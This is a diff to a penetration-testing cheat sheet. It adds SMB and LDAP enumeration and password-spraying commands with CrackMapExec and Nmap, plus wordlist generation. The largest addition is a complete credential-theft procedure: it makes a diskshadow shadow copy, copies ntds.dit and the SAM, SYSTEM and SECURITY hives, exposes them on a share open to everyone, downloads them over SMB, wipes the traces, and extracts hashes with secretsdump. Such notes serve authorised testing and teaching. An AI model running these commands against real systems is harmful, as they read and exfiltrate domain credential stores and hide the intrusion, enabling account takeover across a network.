@@ -353,21 +353,23 @@ root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd1!'
 
 
 
-### crackmapexec
+### CrackMapExec
+
+Install bleeding-edge:
 
 ```
-root@kali:$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd1!' --shares [--continue-on-success]
-root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd1!' --spider-folder 'E\$' --pattern s3cret
+$ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
+$ sudo python3 -m pip install pipenv
+$ pipenv install && pipenv shell
+(CrackMapExec) $ python setup.py install
+(CrackMapExec) $ sudo ln -s /home/snovvcrash/.virtualenvs/CrackMapExec/bin/crackmapexec /usr/bin/CME
+(CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p '' -M spider_plus
 ```
 
-Same password spraying with Metasploit:
-
 ```
-msf5 > use auxiliary/scanner/smb/smb_login
-msf5 auxiliary(scanner/smb/smb_login) > setg USER_FILE users.txt
-msf5 auxiliary(scanner/smb/smb_login) > setg PASS_FILE passwords.txt
-msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 127.0.0.1
-msf5 auxiliary(scanner/smb/smb_login) > run
+$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd1!' --shares [--continue-on-success]
+$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd1!' --spider-folder 'E\$' --pattern s3cret
+$ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd1!' -d 'CORP' --spider Users --pattern '.'
 ```
 
 
@@ -436,6 +438,12 @@ Simple authentication with ldapsearch:
 $ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=example,DC=local' -w 'Passw0rd1!' -s sub -b 'DC=example,DC=local' |tee ldapsearch.log
 ```
 
+Analyze large output for anomalies by searching for unique strings:
+
+```
+$ cat ldapsearch.log | awk '{print $1}' | sort | uniq -c | sort -nr
+```
+
 
 
 ### windapsearch
@@ -465,9 +473,10 @@ Enumerate all AD Computers:
 ### Nmap NSE
 
 ```
-root@kali:$ nmap -n -Pn --script=ldap-rootdse 127.0.0.1 -p389
-root@kali:$ nmap -n -Pn --script=ldap-search 127.0.0.1 -p389
-root@kali:$ nmap -n -Pn --script=ldap-brute 127.0.0.1 -p389
+$ nmap -n -Pn --script=ldap-rootdse 127.0.0.1 -p389
+$ nmap -n -Pn --script=ldap-search 127.0.0.1 -p389
+$ nmap -n -Pn --script=ldap-brute 127.0.0.1 -p389
+$ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-args=unsafe=1 127.0.0.1
 ```
 
 
@@ -835,6 +844,76 @@ $ python -m peas --list-unc='\\DC02\NETLOGON' -u 'CORP\snovvcrash' -p 'Passw0rd1
 ```
 PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
 $ pypykatz lsa minidump lsass.dmp
+```
+
+
+
+### SAM & NTDS
+
+Locate `diskshadow.exe`:
+
+```
+cmd /c where /R C:\ diskshadow.exe
+```
+
+Create shadow volume:
+
+```
+powershell -c "Add-Content add_vol.txt 'set context persistent nowriters'"
+powershell -c "Add-Content add_vol.txt 'set metadata c:\windows\system32\spool\drivers\color\example.cab'"
+powershell -c "Add-Content add_vol.txt 'set verbose on'"
+powershell -c "Add-Content add_vol.txt 'begin backup'"
+powershell -c "Add-Content add_vol.txt 'add volume c: alias DCROOT'"
+powershell -c "Add-Content add_vol.txt 'create'"
+powershell -c "Add-Content add_vol.txt 'expose %DCROOT% w:'"
+powershell -c "Add-Content add_vol.txt 'end backup'"
+cmd /c diskshadow.exe /s add_vol.txt
+```
+
+Exfiltrate over SMB:
+
+```
+mkdir C:\smb_pentest
+copy w:\Windows\NTDS\ntds.dit C:\smb_pentest\ntds.dit
+cmd /c reg.exe save hklm\system C:\smb_pentest\system.hive
+cmd /c reg.exe save hklm\sam C:\smb_pentest\sam.hive
+cmd /c reg.exe save hklm\security C:\smb_pentest\security.hive
+cmd /c net share pentest=c:\smb_pentest /GRANT:"Everyone,FULL"
+
+$ smbclient.py 'snovvcrash:Passw0rd!@127.0.0.1'
+# use pentest
+# get ntds.dit
+# get system.hive
+# get sam.hive
+# get security.hive
+```
+
+Delete shadow volume:
+
+```
+powershell -c "Add-Content delete_vol.txt 'set context persistent nowriters'"
+powershell -c "Add-Content delete_vol.txt 'set metadata c:\windows\system32\spool\drivers\color\example.cab'"
+powershell -c "Add-Content delete_vol.txt 'set verbose on'"
+powershell -c "Add-Content delete_vol.txt 'unexpose w:'"
+powershell -c "Add-Content delete_vol.txt 'delete shadows volume c:'"
+powershell -c "Add-Content delete_vol.txt 'reset'"
+cmd /c diskshadow.exe /s delete_vol.txt
+```
+
+Clean up:
+
+```
+cmd /c net share pentest /delete
+rm -re -fo C:\smb_pentest
+rm c:\windows\system32\spool\drivers\color\example.cab
+rm add_vol.txt
+rm delete_vol.txt
+```
+
+Parse secrets:
+
+```
+$ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
 ```
 
 
@@ -2443,6 +2522,10 @@ root@kali:$ nmap --script http-waf-fingerprint 127.0.0.1 -p80
 
 ## Generate Password List
 
+
+
+### hashcat
+
 Potentially valid users if got any, `John Doe` as an example:
 
 ```
@@ -2539,6 +2622,14 @@ EOF
 
 
 
+### cewl
+
+```
+$ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://example.local/somedir/logs/html/index.htm
+```
+
+
+
 
 
 # Reverse & PWN
@@ -2598,8 +2689,9 @@ $ sudo apt install openjdk-11-jdk
 
 ```
 * Check src
-root@kali:$ whatweb http://127.0.0.1
-root@kali:$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,ini,config,cfg,xml,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+$ whatweb http://127.0.0.1
+$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,ini,config,cfg,xml,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+$ nikto -h http://127.0.0.1 -Cgidirs all
 ```
 
 
@@ -3667,7 +3759,7 @@ $ sudo iptables -S [INPUT [1]]
 
 
 
-### fail2ban:
+### fail2ban
 
 ```bash
 # Filters location which turn into *user-defined* fail2ban iptables rules (automatically)
